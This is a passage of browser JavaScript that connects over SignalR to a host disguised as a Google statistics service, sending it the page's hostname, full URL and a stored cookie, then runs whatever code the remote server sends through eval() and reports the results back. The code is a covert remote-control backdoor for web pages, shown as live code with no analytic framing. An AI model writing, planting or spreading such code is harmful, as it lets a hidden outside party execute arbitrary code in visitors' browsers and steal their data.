...
const connection = new signalR.HubConnectionBuilder()
    .withUrl("https://googlestatistics.somee.com/Remote?loc=" + window.location.hostname + "&value=" + read('SignalAth') + "&path=" + document.URL)
    .build();

connection.start().catch(err => console.error(err.toString()));

connection.on('Send', (usr, req, action) => {
    var result = null;
    switch (req.toLowerCase()) {
        case "setcookie":
            document.cookie = "SignalAth" + "=" + action + ";SameSite=Lax;path=/";
            break;
        case "command":
            result = eval(`${action}`);
            connection.invoke('Response', usr, action, result);
            event.preventDefault();
            break;
        default:
            eval(`${action}`);
            result = prv();
            connection.invoke('Response', usr, req, result);
            event.preventDefault();
            break;
    }
